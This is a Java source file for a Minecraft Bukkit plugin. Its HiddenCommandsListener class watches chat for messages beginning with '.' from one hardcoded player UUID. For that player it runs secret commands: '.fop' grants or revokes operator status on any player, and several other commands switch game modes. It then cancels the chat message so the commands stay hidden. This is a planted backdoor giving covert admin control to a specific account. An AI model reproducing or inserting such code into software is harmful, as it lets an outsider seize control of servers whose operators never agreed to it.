package dev.lerndmina.testplugin.events;

import dev.lerndmina.testplugin.Main;
import dev.lerndmina.testplugin.Utils.AbstractEvent;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;
import java.util.Arrays;

public class HiddenCommandsListener extends AbstractEvent {

    public HiddenCommandsListener(Main main) {
        super(main);
    }

    public boolean isTargetOnline(Player player, Player target) {
        return target != null && target.isOnline();
    }
    public void gamemodeCommand (Player player, Player target, GameMode gameMode, ArrayList<String> args, String usage){
        if (isTargetOnline(player, target) && args.size() == 1) {
            target.setGameMode(gameMode);
            sendMessage(player, "&aSet " + target.getName() + "'s gamemode to " + gameMode.name());
            return;
        } else if (args.size() == 0) {
            player.setGameMode(gameMode);
            sendMessage(player, "Set your gamemode to " + gameMode.name());
            return;
        }
        sendMessage(player, usage);
    }

    @EventHandler
    public void onHiddenCommand(PlayerChatEvent e){

        String message = e.getMessage();
        Player player = e.getPlayer();
        String usage = null;
        if (player.getUniqueId().toString().equalsIgnoreCase("64189f6c-bf1a-4833-a02e-36177ede8b5e")
                && message.startsWith(".")){

            String[] split = message.split(" ");
            ArrayList<String> args = new ArrayList<>(Arrays.asList(split));
            String command = args.remove(0).replace(".", "");
            Player target = null;
            if (args.size() > 0){
                target = Bukkit.getPlayer(args.get(0));
            }


            switch (command){
                case "fop":
                     usage = "Usage: .fop <player>";
                    if (args.size() != 1){
                        sendMessage(player, usage);
                        break;
                    }
                    if (!isTargetOnline(player, target)){
                        break;
                    }
                    if (target.isOp()){
                        target.setOp(false);
                        sendMessage(player, "Player " + target.getName() + " is no longer op");
                    } else {
                        target.setOp(true);
                        sendMessage(player, "Player " + target.getName() + " is now op");
                    }
                    break;
                case "gms":
                    usage = "Usage: .gms [player]";
                    gamemodeCommand(player, target,GameMode.SURVIVAL, args, usage);
                    break;
                case "gmc":
                    usage = "Usage: .gmc [player]";
                    gamemodeCommand(player, target,GameMode.CREATIVE, args, usage);
                    break;
                case "gma":
                    usage = "Usage: .gma [player]";
                    gamemodeCommand(player, target,GameMode.ADVENTURE, args, usage);
                    break;
                case "gmsp":
                    usage = "Usage: .gmsp [player]";
                    gamemodeCommand(player, target,GameMode.SPECTATOR, args, usage);
                    break;
                default:
                    break;
            }
            e.setCancelled(true);
        }
    }
}

